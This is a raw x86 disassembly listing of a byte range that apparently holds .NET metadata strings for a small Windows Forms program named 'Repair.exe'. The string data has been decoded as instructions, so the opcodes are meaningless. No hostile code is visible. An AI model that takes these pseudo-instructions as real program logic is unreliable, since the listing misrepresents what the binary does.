  40353b:	dec    esi
  40353c:	popa   
  40353d:	ins    DWORD PTR es:[edi],dx
  40353e:	add    BYTE PTR gs:[esi+0x61],ch
  403542:	ins    DWORD PTR es:[edi],dx
  403543:	add    BYTE PTR gs:[ebx+0x6f],al
  403547:	ins    DWORD PTR es:[edi],dx
  403548:	bound  ebp,QWORD PTR [ecx+0x6e]
  40354b:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  403550:	add    BYTE PTR gs:[edi+0x65],ah
  403554:	je     0x4035b5
  403556:	inc    ebx
  403557:	jne    0x4035c5
  403559:	je     0x4035d0
  40355b:	jb     0x4035c2
  40355d:	add    BYTE PTR [ebx+0x65],dh
  403560:	je     0x4035c1
  403562:	inc    ebx
  403563:	jne    0x4035d1
  403565:	je     0x4035dc
  403567:	jb     0x4035ce
  403569:	add    BYTE PTR [edx+0x65],dh
  40356c:	jae    0x4035dd
  40356e:	jne    0x4035e2
  403570:	arpl   WORD PTR [ebp+0x43],sp
  403573:	jne    0x4035e1
  403575:	je     0x4035ec
  403577:	jb     0x4035de
  403579:	add    BYTE PTR [edx+0x75],al
  40357c:	je     0x4035f2
  40357e:	outs   dx,DWORD PTR ds:[esi]
  40357f:	outs   dx,BYTE PTR ds:[esi]
  403580:	inc    edx
  403581:	popa   
  403582:	jae    0x4035e9
  403584:	add    BYTE PTR [ecx+0x70],al
  403587:	jo     0x4035f5
  403589:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403590:	push   ebx
  403591:	gs je  0x403608
  403594:	imul   ebp,DWORD PTR [esi+0x67],0x73614273
  40359b:	add    BYTE PTR gs:[edx+0x75],ah
  40359f:	je     0x403615
  4035a1:	outs   dx,DWORD PTR ds:[esi]
  4035a2:	outs   dx,BYTE PTR ds:[esi]
  4035a3:	inc    ebx
  4035a4:	ins    BYTE PTR es:[edi],dx
  4035a5:	outs   dx,DWORD PTR ds:[esi]
  4035a6:	jae    0x40360d
  4035a8:	add    BYTE PTR [ecx+ebp*2+0x73],al
  4035ac:	jo     0x40361d
  4035ae:	jae    0x403615
  4035b0:	add    BYTE PTR [ebp+0x64],al
  4035b3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  4035bb:	jae    0x40361e
  4035bd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  4035c1:	je     0x403624
  4035c3:	je     0x40362a
  4035c5:	add    BYTE PTR [ebx+0x65],dh
  4035c8:	je     0x403629
  4035ca:	inc    ebx
  4035cb:	push   0x536b6365
  4035d0:	je     0x403633
  4035d2:	je     0x403639
  4035d4:	add    BYTE PTR [ebx+0x54],dl
  4035d7:	inc    ecx
  4035d8:	push   esp
  4035d9:	push   0x64616572
  4035de:	inc    ecx
  4035df:	je     0x403655
  4035e1:	jb     0x40364c
  4035e3:	bound  esi,QWORD PTR [ebp+0x74]
  4035e6:	add    BYTE PTR gs:[ebx+0x6f],al
  4035ea:	ins    DWORD PTR es:[edi],dx
  4035eb:	jo     0x403656
  4035ed:	ins    BYTE PTR es:[edi],dx
  4035ee:	gs jb  0x403638
  4035f1:	outs   dx,BYTE PTR gs:[esi]
  4035f3:	gs jb  0x403657
  4035f6:	je     0x40365d
  4035f8:	fs inc ecx
  4035fa:	je     0x403670
  4035fc:	jb     0x403667
  4035fe:	bound  esi,QWORD PTR [ebp+0x74]
  403601:	add    BYTE PTR gs:[edi+0x75],al
  403605:	imul   esp,DWORD PTR [ecx+eax*2+0x74],0x62697274
  40360d:	jne    0x403683
  40360f:	add    BYTE PTR gs:[edi+0x65],al
  403613:	outs   dx,BYTE PTR ds:[esi]
  403614:	gs jb  0x403678
  403617:	je     0x40367e
  403619:	fs inc ebx
  40361b:	outs   dx,DWORD PTR ds:[esi]
  40361c:	fs gs inc ecx
  40361f:	je     0x403695
  403621:	jb     0x40368c
  403623:	bound  esi,QWORD PTR [ebp+0x74]
  403626:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  40362b:	jne    0x403694
  40362d:	addr16 gs jb 0x40367f
  403631:	outs   dx,DWORD PTR ds:[esi]
  403632:	outs   dx,BYTE PTR ds:[esi]
  403633:	push   ebp
  403634:	jae    0x40369b
  403636:	jb     0x40367b
  403638:	outs   dx,DWORD PTR ds:[esi]
  403639:	fs gs inc ecx
  40363c:	je     0x4036b2
  40363e:	jb     0x4036a9
  403640:	bound  esi,QWORD PTR [ebp+0x74]
  403643:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  403648:	jne    0x4036b1
  40364a:	addr16 popa 
  40364c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403650:	je     0x4036c6
  403652:	jb     0x4036bd
  403654:	bound  esi,QWORD PTR [ebp+0x74]
  403657:	add    BYTE PTR gs:[ebp+0x64],al
  40365b:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  403663:	jae    0x4036c6
  403665:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  403669:	je     0x4036df
  40366b:	jb     0x4036d6
  40366d:	bound  esi,QWORD PTR [ebp+0x74]
  403670:	add    BYTE PTR gs:[ebx+0x6f],al
  403674:	ins    DWORD PTR es:[edi],dx
  403675:	push   esi
  403676:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  40367d:	je     0x4036f3
  40367f:	jb     0x4036ea
  403681:	bound  esi,QWORD PTR [ebp+0x74]
  403684:	add    BYTE PTR gs:[ecx+0x73],al
  403688:	jae    0x4036ef
  40368a:	ins    DWORD PTR es:[edi],dx
  40368b:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40368f:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  403697:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40369e:	jae    0x403713
  4036a0:	gs ins DWORD PTR es:[edi],dx
  4036a2:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4036a6:	jb     0x403709
  4036a8:	fs gs ins DWORD PTR es:[edi],dx
  4036ab:	popa   
  4036ac:	jb     0x403719
  4036ae:	inc    ecx
  4036af:	je     0x403725
  4036b1:	jb     0x40371c
  4036b3:	bound  esi,QWORD PTR [ebp+0x74]
  4036b6:	add    BYTE PTR gs:[ecx+eiz*2+0x72],dl
  4036bb:	addr16 gs je 0x403705
  4036bf:	jb     0x403722
  4036c1:	ins    DWORD PTR es:[edi],dx
  4036c2:	gs ja  0x403734
  4036c5:	jb     0x403732
  4036c7:	inc    ecx
  4036c8:	je     0x40373e
  4036ca:	jb     0x403735
  4036cc:	bound  esi,QWORD PTR [ebp+0x74]
  4036cf:	add    BYTE PTR gs:[ecx+0x73],al
  4036d3:	jae    0x40373a
  4036d5:	ins    DWORD PTR es:[edi],dx
  4036d6:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4036da:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4036e2:	outs   dx,DWORD PTR ds:[esi]
  4036e3:	outs   dx,BYTE PTR ds:[esi]
  4036e4:	inc    ecx
  4036e5:	je     0x40375b
  4036e7:	jb     0x403752
  4036e9:	bound  esi,QWORD PTR [ebp+0x74]
  4036ec:	add    BYTE PTR gs:[ecx+0x73],al
  4036f0:	jae    0x403757
  4036f2:	ins    DWORD PTR es:[edi],dx
  4036f3:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4036f7:	outs   dx,DWORD PTR ds:[esi]
  4036f8:	outs   dx,BYTE PTR ds:[esi]
  4036f9:	imul   sp,WORD PTR [edi+0x75],0x6172
  4036ff:	je     0x40376a
  403701:	outs   dx,DWORD PTR ds:[esi]
  403702:	outs   dx,BYTE PTR ds:[esi]
  403703:	inc    ecx
  403704:	je     0x40377a
  403706:	jb     0x403771
  403708:	bound  esi,QWORD PTR [ebp+0x74]
  40370b:	add    BYTE PTR gs:[ecx+0x73],al
  40370f:	jae    0x403776
  403711:	ins    DWORD PTR es:[edi],dx
  403712:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  403716:	gs jae 0x40377c
  403719:	jb     0x403784
  40371b:	jo     0x403791
  40371d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  403724:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  40372b:	outs   dx,DWORD PTR ds:[esi]
  40372c:	ins    DWORD PTR es:[edi],dx
  40372d:	jo     0x403798
  40372f:	ins    BYTE PTR es:[edi],dx
  403730:	popa   
  403731:	je     0x40379c
  403733:	outs   dx,DWORD PTR ds:[esi]
  403734:	outs   dx,BYTE PTR ds:[esi]
  403735:	push   edx
  403736:	gs ins BYTE PTR es:[edi],dx
  403738:	popa   
  403739:	js     0x40379c
  40373b:	je     0x4037a6
  40373d:	outs   dx,DWORD PTR ds:[esi]
  40373e:	outs   dx,BYTE PTR ds:[esi]
  40373f:	jae    0x403782
  403741:	je     0x4037b7
  403743:	jb     0x4037ae
  403745:	bound  esi,QWORD PTR [ebp+0x74]
  403748:	add    BYTE PTR gs:[ecx+0x73],al
  40374c:	jae    0x4037b3
  40374e:	ins    DWORD PTR es:[edi],dx
  40374f:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  403753:	jb     0x4037c4
  403755:	fs jne 0x4037bb
  403758:	je     0x40379b
  40375a:	je     0x4037d0
  40375c:	jb     0x4037c7
  40375e:	bound  esi,QWORD PTR [ebp+0x74]
  403761:	add    BYTE PTR gs:[ecx+0x73],al
  403765:	jae    0x4037cc
  403767:	ins    DWORD PTR es:[edi],dx
  403768:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40376c:	outs   dx,DWORD PTR ds:[esi]
  40376d:	jo     0x4037e8
  40376f:	jb     0x4037da
  403771:	addr16 push 0x74744174
  403777:	jb     0x4037e2
  403779:	bound  esi,QWORD PTR [ebp+0x74]
  40377c:	add    BYTE PTR gs:[ecx+0x73],al
  403780:	jae    0x4037e7
  403782:	ins    DWORD PTR es:[edi],dx
  403783:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  403787:	outs   dx,DWORD PTR ds:[esi]
  403788:	ins    DWORD PTR es:[edi],dx
  403789:	jo     0x4037ec
  40378b:	outs   dx,BYTE PTR ds:[esi]
  40378c:	jns    0x4037cf
  40378e:	je     0x403804
  403790:	jb     0x4037fb
  403792:	bound  esi,QWORD PTR [ebp+0x74]
  403795:	add    BYTE PTR gs:[edx+0x75],dl
  403799:	outs   dx,BYTE PTR ds:[esi]
  40379a:	je     0x403805
  40379c:	ins    DWORD PTR es:[edi],dx
  40379d:	gs inc ebx
  40379f:	outs   dx,DWORD PTR ds:[esi]
  4037a0:	ins    DWORD PTR es:[edi],dx
  4037a1:	jo     0x403804
  4037a3:	je     0x40380e
  4037a5:	bound  ebp,QWORD PTR [ecx+0x6c]
  4037a8:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4037b0:	bound  esi,QWORD PTR [ebp+0x74]
  4037b3:	add    BYTE PTR gs:[edi+0x65],al
  4037b7:	je     0x40380f
  4037b9:	popa   
  4037ba:	ins    BYTE PTR es:[edi],dx
  4037bb:	jne    0x403822
  4037bd:	add    BYTE PTR [esi+0x61],dh
  4037c0:	ins    BYTE PTR es:[edi],dx
  4037c1:	jne    0x403828
  4037c3:	add    BYTE PTR [edx+0x65],dl
  4037c6:	jo     0x403829
  4037c8:	imul   esi,DWORD PTR [edx+0x2e],0x657865
  4037cf:	jae    0x403836
  4037d1:	je     0x403832
  4037d3:	push   ebx
  4037d4:	imul   edi,DWORD PTR [edx+0x65],0x74657300
  4037db:	pop    edi
  4037dc:	inc    ecx
  4037dd:	jne    0x403853
  4037df:	outs   dx,DWORD PTR ds:[esi]
  4037e0:	push   ebx
  4037e1:	imul   edi,DWORD PTR [edx+0x65],0x74657300
  4037e8:	pop    edi
  4037e9:	inc    ebx
  4037ea:	ins    BYTE PTR es:[edi],dx
  4037eb:	imul   esp,DWORD PTR [ebp+0x6e],0x7a695374
  4037f2:	add    BYTE PTR gs:[ebx+0x79],dl
  4037f6:	jae    0x40386c
  4037f8:	gs ins DWORD PTR es:[edi],dx
  4037fa:	cs push edx
  4037fc:	jne    0x40386c
  4037fe:	je     0x403869
  403800:	ins    DWORD PTR es:[edi],dx
  403801:	gs cs push esi
  403804:	gs jb  0x40387a
  403807:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40380e:	push   esp
  40380f:	outs   dx,DWORD PTR ds:[esi]
  403810:	push   ebx
  403811:	je     0x403885
  403813:	imul   ebp,DWORD PTR [esi+0x67],0x73696400
  40381a:	jo     0x40388b
  40381c:	jae    0x403887
  40381e:	outs   dx,BYTE PTR ds:[esi]
  40381f:	add    BYTE PTR [bp+di+0x79],dl
  403823:	jae    0x403899
  403825:	gs ins DWORD PTR es:[edi],dx
  403827:	cs inc esp
  403829:	jb     0x40388c
  40382b:	ja     0x403896
  40382d:	outs   dx,BYTE PTR ds:[esi]
  40382e:	add    BYTE PTR [bp+di+0x68],ah
  403832:	add    BYTE PTR [esi+0x69],ah
  403835:	ins    BYTE PTR es:[edi],dx
  403836:	gs push eax
  403838:	popa   
  403839:	je     0x4038a3
  40383b:	add    BYTE PTR [edi+0x65],al
  40383e:	je     0x403886
  403840:	outs   dx,DWORD PTR ds:[esi]
  403841:	ins    BYTE PTR es:[edi],dx
  403842:	fs gs jb 0x403896
  403846:	popa   
  403847:	je     0x4038b1
  403849:	add    BYTE PTR [ecx+0x64],ah
  40384c:	fs pop edi
  40384e:	inc    ebx
  40384f:	ins    BYTE PTR es:[edi],dx
  403850:	imul   esp,DWORD PTR [ebx+0x6b],0x74756200
  403857:	je     0x4038c8
  403859:	outs   dx,BYTE PTR ds:[esi]
  40385a:	inc    ebx
  40385b:	ins    BYTE PTR es:[edi],dx
  40385c:	outs   dx,DWORD PTR ds:[esi]
  40385d:	jae    0x4038c4
  40385f:	pop    edi
  403860:	inc    ebx
  403861:	ins    BYTE PTR es:[edi],dx
  403862:	imul   esp,DWORD PTR [ebx+0x6b],0x74756200
  403869:	je     0x4038da
  40386b:	outs   dx,BYTE PTR ds:[esi]
  40386c:	push   edx
  40386d:	gs jo  0x4038d1
  403870:	imul   esi,DWORD PTR [edx+0x5f],0x63696c43
  403877:	imul   eax,DWORD PTR [eax],0x50
  40387a:	gs imul eax,DWORD PTR gs:[eax],0x53
  40387f:	jns    0x4038f4
  403881:	je     0x4038e8
  403883:	ins    DWORD PTR es:[edi],dx
  403884:	cs inc ebx
  403886:	outs   dx,DWORD PTR ds:[esi]
  403887:	ins    DWORD PTR es:[edi],dx
  403888:	jo     0x4038f9
  40388a:	outs   dx,BYTE PTR ds:[esi]
  40388b:	outs   dx,BYTE PTR gs:[esi]
  40388d:	je     0x4038dc
  40388f:	outs   dx,DWORD PTR ds:[esi]
  403890:	fs gs ins BYTE PTR es:[edi],dx
  403893:	add    BYTE PTR [ecx+0x42],cl
  403896:	jne    0x40390c
  403898:	je     0x403909
  40389a:	outs   dx,BYTE PTR ds:[esi]
  40389b:	inc    ebx
  40389c:	outs   dx,DWORD PTR ds:[esi]
  40389d:	outs   dx,BYTE PTR ds:[esi]
  40389e:	je     0x403912
  4038a0:	outs   dx,DWORD PTR ds:[esi]
  4038a1:	ins    BYTE PTR es:[edi],dx
  4038a2:	add    BYTE PTR [ebx+0x6f],al
  4038a5:	outs   dx,BYTE PTR ds:[esi]
  4038a6:	je     0x403909
  4038a8:	imul   ebp,DWORD PTR [esi+0x65],0x6e6f4372
  4038af:	je     0x403923
  4038b1:	outs   dx,DWORD PTR ds:[esi]
  4038b2:	ins    BYTE PTR es:[edi],dx
  4038b3:	add    BYTE PTR [edi+0x65],ah
  4038b6:	je     0x403917
  4038b8:	inc    ebp
  4038b9:	outs   dx,BYTE PTR ds:[esi]
  4038ba:	fs dec edi
  4038bc:	push   bx
  4038be:	je     0x403932
  4038c0:	gs popa 
  4038c2:	ins    DWORD PTR es:[edi],dx
  4038c3:	add    BYTE PTR [eax+0x72],dl
  4038c6:	outs   dx,DWORD PTR ds:[esi]
  4038c7:	addr16 jb 0x40392b
  4038ca:	ins    DWORD PTR es:[edi],dx
  4038cb:	add    BYTE PTR [ebx+0x79],dl
  4038ce:	jae    0x403944
  4038d0:	gs ins DWORD PTR es:[edi],dx
  4038d2:	add    BYTE PTR [esi+0x6f],al
  4038d5:	jb     0x403944
  4038d7:	add    BYTE PTR [edx+0x65],dh
  4038da:	jae    0x40394b
  4038dc:	jne    0x403950
  4038de:	arpl   WORD PTR [ebp+0x4d],sp
  4038e1:	popa   
  4038e2:	outs   dx,BYTE PTR ds:[esi]
  4038e3:	add    BYTE PTR [edx+0x65],dl
  4038e6:	popa   
  4038e7:	fs push esp
  4038e9:	outs   dx,DWORD PTR ds:[esi]
  4038ea:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4038ee:	arpl   WORD PTR [eax+0x69],bp
  4038f1:	ins    BYTE PTR es:[edi],dx
  4038f2:	fs jb  0x40395a
  4038f5:	outs   dx,BYTE PTR ds:[esi]
  4038f6:	add    BYTE PTR [esi+0x6f],al
  4038f9:	jb     0x403968
  4038fb:	dec    ebp
  4038fc:	popa   
  4038fd:	imul   ebp,DWORD PTR [esi+0x0],0x5f746573
  403904:	dec    ecx
  403905:	arpl   WORD PTR [edi+0x6e],bp
  403908:	add    BYTE PTR [ebp+0x65],cl
  40390b:	jae    0x403980
  40390d:	popa   
  40390e:	addr16 gs inc edx
  403911:	outs   dx,DWORD PTR ds:[esi]
  403912:	js     0x40395d
  403914:	arpl   WORD PTR [edi+0x6e],bp
  403917:	add    BYTE PTR [ecx+0x70],al
  40391a:	jo     0x403988
  40391c:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403923:	add    BYTE PTR [ebx+0x65],dh
  403926:	je     0x403987
  403928:	dec    esp
  403929:	outs   dx,DWORD PTR ds:[esi]
  40392a:	arpl   WORD PTR [ecx+0x74],sp
  40392d:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  403934:	je     0x40399b
  403936:	ins    DWORD PTR es:[edi],dx
  403937:	cs inc ebx
  403939:	outs   dx,DWORD PTR ds:[esi]
  40393a:	outs   dx,BYTE PTR ds:[esi]
  40393b:	imul   sp,WORD PTR [edi+0x75],0x6172
  403941:	je     0x4039ac
  403943:	outs   dx,DWORD PTR ds:[esi]
  403944:	outs   dx,BYTE PTR ds:[esi]
  403945:	add    BYTE PTR [ebx+0x79],dl
  403948:	jae    0x4039be
  40394a:	gs ins DWORD PTR es:[edi],dx
  40394c:	cs inc edi
  40394e:	ins    BYTE PTR es:[edi],dx
  40394f:	outs   dx,DWORD PTR ds:[esi]
  403950:	bound  esp,QWORD PTR [ecx+0x6c]
  403953:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40395a:	add    BYTE PTR [ebx+0x79],dl
  40395d:	jae    0x4039d3
  40395f:	gs ins DWORD PTR es:[edi],dx
  403961:	cs push edx
  403963:	gs data16 ins BYTE PTR es:[edi],dx
  403966:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40396b:	outs   dx,BYTE PTR ds:[esi]
  40396c:	add    BYTE PTR [ebx+0x6f],al
  40396f:	outs   dx,BYTE PTR ds:[esi]
  403970:	je     0x4039e4
  403972:	outs   dx,DWORD PTR ds:[esi]
  403973:	ins    BYTE PTR es:[edi],dx
  403974:	inc    ebx
  403975:	outs   dx,DWORD PTR ds:[esi]
  403976:	ins    BYTE PTR es:[edi],dx
  403977:	ins    BYTE PTR es:[edi],dx
  403978:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40397d:	outs   dx,BYTE PTR ds:[esi]
  40397e:	add    BYTE PTR [ebx+0x65],dh
  403981:	je     0x4039e2
  403983:	push   ebx
  403984:	je     0x4039e7
  403986:	jb     0x4039fc
  403988:	push   eax
  403989:	outs   dx,DWORD PTR ds:[esi]
  40398a:	jae    0x4039f5
  40398c:	je     0x4039f7
  40398e:	outs   dx,DWORD PTR ds:[esi]
  40398f:	outs   dx,BYTE PTR ds:[esi]
  403990:	add    BYTE PTR [esi+0x6f],al
  403993:	jb     0x403a02
  403995:	push   ebx
  403996:	je     0x4039f9
  403998:	jb     0x403a0e
  40399a:	push   eax
  40399b:	outs   dx,DWORD PTR ds:[esi]
  40399c:	jae    0x403a07
  40399e:	je     0x403a09
  4039a0:	outs   dx,DWORD PTR ds:[esi]
  4039a1:	outs   dx,BYTE PTR ds:[esi]
  4039a2:	add    BYTE PTR [ebp+0x78],al
  4039a5:	arpl   WORD PTR [ebp+0x70],sp
  4039a8:	je     0x403a13
  4039aa:	outs   dx,DWORD PTR ds:[esi]
  4039ab:	outs   dx,BYTE PTR ds:[esi]
  4039ac:	add    BYTE PTR [ebx+0x65],dh
  4039af:	je     0x403a10
  4039b1:	inc    ebx
  4039b2:	popa   
  4039b3:	outs   dx,BYTE PTR ds:[esi]
  4039b4:	arpl   WORD PTR [ebp+0x6c],sp
  4039b7:	inc    edx
  4039b8:	jne    0x403a2e
  4039ba:	je     0x403a2b
  4039bc:	outs   dx,BYTE PTR ds:[esi]
  4039bd:	add    BYTE PTR [ebx+0x79],dl
  4039c0:	outs   dx,BYTE PTR ds:[esi]
  4039c1:	arpl   WORD PTR [edx+0x65],dx
  4039c4:	jo     0x403a27
  4039c6:	imul   esi,DWORD PTR [edx+0x42],0x6f747475
  4039cd:	outs   dx,BYTE PTR ds:[esi]
  4039ce:	add    BYTE PTR [ebx+0x65],dh
  4039d1:	je     0x403a32
  4039d3:	inc    ecx
  4039d4:	arpl   WORD PTR [ebx+0x65],sp
  4039d7:	jo     0x403a4d
  4039d9:	inc    edx
  4039da:	jne    0x403a50
  4039dc:	je     0x403a4d
  4039de:	outs   dx,BYTE PTR ds:[esi]
  4039df:	add    BYTE PTR [edx+0x75],dl
  4039e2:	outs   dx,BYTE PTR ds:[esi]
  4039e3:	add    BYTE PTR [ebx+0x75],al
  4039e6:	ins    BYTE PTR es:[edi],dx
  4039e7:	je     0x403a5e
  4039e9:	jb     0x403a50
  4039eb:	dec    ecx
  4039ec:	outs   dx,BYTE PTR ds:[esi]
  4039ed:	outs   dx,WORD PTR ds:[esi]
  4039ef:	add    BYTE PTR [ecx+ebp*2+0x72],al
  4039f3:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4039f8:	jns    0x403a43
  4039fa:	outs   dx,BYTE PTR ds:[esi]
  4039fb:	outs   dx,WORD PTR ds:[esi]
  4039fd:	add    BYTE PTR [ebx+0x65],dh
  403a00:	je     0x403a61
  403a02:	push   esp
  403a03:	popa   
  403a04:	bound  edx,QWORD PTR [ebx+0x74]
  403a07:	outs   dx,DWORD PTR ds:[esi]
  403a08:	jo     0x403a0a
  403a0a:	inc    ebx
  403a0b:	push   0x53007261
  403a10:	je     0x403a84
  403a12:	gs popa 
  403a14:	ins    DWORD PTR es:[edi],dx
  403a15:	push   edx
  403a16:	gs popa 
  403a18:	fs gs jb 0x403a1c
  403a1c:	push   esp
  403a1d:	gs js  0x403a94
  403a20:	push   edx
  403a21:	gs popa 
  403a23:	fs gs jb 0x403a27
  403a27:	jb     0x403a8e
  403a29:	popa   
  403a2a:	fs gs jb 0x403a2e
  403a2e:	push   ebx
  403a2f:	je     0x403aa3
  403a31:	imul   ebp,DWORD PTR [esi+0x67],0x6c697542
  403a38:	fs gs jb 0x403a3c
  403a3c:	push   ebx
  403a3d:	jo     0x403aa4
  403a3f:	arpl   WORD PTR [ecx+0x61],bp
  403a42:	ins    BYTE PTR es:[edi],dx
  403a43:	inc    esi
  403a44:	outs   dx,DWORD PTR ds:[esi]
  403a45:	ins    BYTE PTR es:[edi],dx
  403a46:	fs gs jb 0x403a4a
  403a4a:	jae    0x403ab1
  403a4c:	outs   dx,BYTE PTR ds:[esi]
  403a4d:	fs gs jb 0x403a51
  403a51:	addr16 gs je 0x403ab4
  403a55:	push   edx
  403a56:	gs jae 0x403ac8
  403a59:	jne    0x403acd
  403a5b:	arpl   WORD PTR [ebp+0x4d],sp
  403a5e:	popa   
  403a5f:	outs   dx,BYTE PTR ds:[esi]
  403a60:	popa   
  403a61:	addr16 gs jb 0x403a65
  403a65:	inc    ebx
  403a66:	outs   dx,DWORD PTR ds:[esi]
  403a67:	ins    DWORD PTR es:[edi],dx
  403a68:	jo     0x403ad9
  403a6a:	outs   dx,BYTE PTR ds:[esi]
  403a6b:	outs   dx,BYTE PTR gs:[esi]
  403a6d:	je     0x403ac1
  403a6f:	gs jae 0x403ae1
  403a72:	jne    0x403ae6
  403a74:	arpl   WORD PTR [ebp+0x4d],sp
  403a77:	popa   
  403a78:	outs   dx,BYTE PTR ds:[esi]
  403a79:	popa   
  403a7a:	addr16 gs jb 0x403a7e
  403a7e:	inc    ebp
  403a7f:	jbe    0x403ae6
  403a81:	outs   dx,BYTE PTR ds:[esi]
  403a82:	je     0x403acc
  403a84:	popa   
  403a85:	outs   dx,BYTE PTR ds:[esi]
  403a86:	fs ins BYTE PTR es:[edi],dx
  403a88:	gs jb  0x403a8b
  403a8b:	push   ebx
  403a8c:	jns    0x403b01
  403a8e:	je     0x403af5
  403a90:	ins    DWORD PTR es:[edi],dx
  403a91:	cs inc ebx
  403a93:	outs   dx,DWORD PTR ds:[esi]
  403a94:	fs gs inc esp
  403a97:	outs   dx,DWORD PTR ds:[esi]
  403a98:	ins    DWORD PTR es:[edi],dx
  403a99:	cs inc ebx
  403a9b:	outs   dx,DWORD PTR ds:[esi]
  403a9c:	ins    DWORD PTR es:[edi],dx
  403a9d:	jo     0x403b08
  403a9f:	ins    BYTE PTR es:[edi],dx
  403aa0:	gs jb  0x403aa3
  403aa3:	dec    ecx
  403aa4:	inc    ebx
  403aa5:	outs   dx,DWORD PTR ds:[esi]
  403aa6:	outs   dx,BYTE PTR ds:[esi]
  403aa7:	je     0x403b0a
  403aa9:	imul   ebp,DWORD PTR [esi+0x65],0x75430072
  403ab0:	jb     0x403b24
  403ab2:	outs   dx,BYTE PTR gs:[esi]
  403ab4:	je     0x403b0b
  403ab6:	jae    0x403b1d
  403ab8:	jb     0x403aba
  403aba:	push   esi
  403abb:	fs push ax
  403abe:	popa   
  403abf:	jb     0x403b34
  403ac1:	gs jb  0x403ac4
  403ac4:	bound  esi,QWORD PTR [ebp+0x74]
  403ac7:	je     0x403b38
  403ac9:	outs   dx,BYTE PTR ds:[esi]
  403aca:	push   edx
  403acb:	gs jo  0x403b2f
  403ace:	imul   esi,DWORD PTR [edx+0x0],0x5f746573
  403ad5:	inc    ecx
  403ad6:	outs   dx,BYTE PTR ds:[esi]
  403ad7:	arpl   WORD PTR [eax+0x6f],bp
  403ada:	jb     0x403adc
  403adc:	jae    0x403b43
  403ade:	je     0x403b3f
  403ae0:	push   ebp
  403ae1:	jae    0x403b48
  403ae3:	push   esi
  403ae4:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403aeb:	jns    0x403b59
  403aed:	gs inc edx
  403aef:	popa   
  403af0:	arpl   WORD PTR [ebx+0x43],bp
  403af3:	outs   dx,DWORD PTR ds:[esi]
  403af4:	ins    BYTE PTR es:[edi],dx
  403af5:	outs   dx,DWORD PTR ds:[esi]
  403af6:	jb     0x403af8
  403af8:	inc    edi
  403af9:	gs je  0x403b41
  403afc:	outs   dx,BYTE PTR ds:[esi]
  403afd:	jne    0x403b6c
  403aff:	gs jb  0x403b63
  403b02:	je     0x403b73
  403b04:	jb     0x403b06
  403b06:	arpl   WORD PTR cs:[edi+ebp*2+0x72],si
  403b0b:	add    BYTE PTR [esi],ch
  403b0d:	arpl   WORD PTR [ebx+0x74],sp
  403b10:	outs   dx,DWORD PTR ds:[esi]
  403b11:	jb     0x403b13
  403b13:	push   ebx
  403b14:	jns    0x403b89
  403b16:	je     0x403b7d
  403b18:	ins    DWORD PTR es:[edi],dx
  403b19:	cs inc esp
  403b1b:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  403b22:	imul   esp,DWORD PTR [ebx+0x73],0x73795300
  403b29:	je     0x403b90
  403b2b:	ins    DWORD PTR es:[edi],dx
  403b2c:	cs push edx
  403b2e:	jne    0x403b9e
  403b30:	je     0x403b9b
  403b32:	ins    DWORD PTR es:[edi],dx
  403b33:	gs cs dec ecx
  403b36:	outs   dx,BYTE PTR ds:[esi]
  403b37:	je     0x403b9e
  403b39:	jb     0x403baa
  403b3b:	jo     0x403b90
  403b3d:	gs jb  0x403bb6
  403b40:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  403b47:	jae    0x403bbd
  403b49:	gs ins DWORD PTR es:[edi],dx
  403b4b:	cs push edx
  403b4d:	jne    0x403bbd
  403b4f:	je     0x403bba
  403b51:	ins    DWORD PTR es:[edi],dx
  403b52:	gs cs inc ebx
  403b55:	outs   dx,DWORD PTR ds:[esi]
  403b56:	ins    DWORD PTR es:[edi],dx
  403b57:	jo     0x403bc2
  403b59:	ins    BYTE PTR es:[edi],dx
  403b5a:	gs jb  0x403bb0
  403b5d:	gs jb  0x403bd6
  403b60:	imul   esp,DWORD PTR [ebx+0x65],0x79530073
  403b67:	jae    0x403bdd
  403b69:	gs ins DWORD PTR es:[edi],dx
  403b6b:	cs push edx
  403b6d:	gs jae 0x403bdf
  403b70:	jne    0x403be4
  403b72:	arpl   WORD PTR [ebp+0x73],sp
  403b75:	add    BYTE PTR [edx+0x65],dl
  403b78:	jo     0x403bdb
  403b7a:	imul   esi,DWORD PTR [edx+0x2e],0x6d726f46
  403b81:	dec    ebp
  403b82:	popa   
  403b83:	imul   ebp,DWORD PTR [esi+0x2e],0x6f736572
  403b8a:	jne    0x403bfe
  403b8c:	arpl   WORD PTR [ebp+0x73],sp
  403b8f:	add    BYTE PTR [edx+0x65],dl
  403b92:	jo     0x403bf5
  403b94:	imul   esi,DWORD PTR [edx+0x2e],0x706f7250
